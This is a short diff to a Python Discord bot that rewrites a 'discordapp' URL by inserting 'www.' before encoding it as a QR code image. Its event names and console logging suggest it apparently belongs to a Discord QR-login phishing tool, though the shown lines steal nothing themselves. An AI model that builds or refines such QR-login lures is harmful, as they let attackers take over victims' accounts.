@@ -253,8 +253,9 @@ async def start(ctx):
             @c.event("on_timeout")
             async def on_timeout():
                 print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Timeout: {data}")
-    
-            embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
+            
+            qrdata = str(data)[:str(data).find('discordapp')] + 'www.' + str(data)[str(data).find('discordapp'):];
+            embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={qrdata}")
             await interaction.edit_original_message(embed=embed_qr)
             print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
     
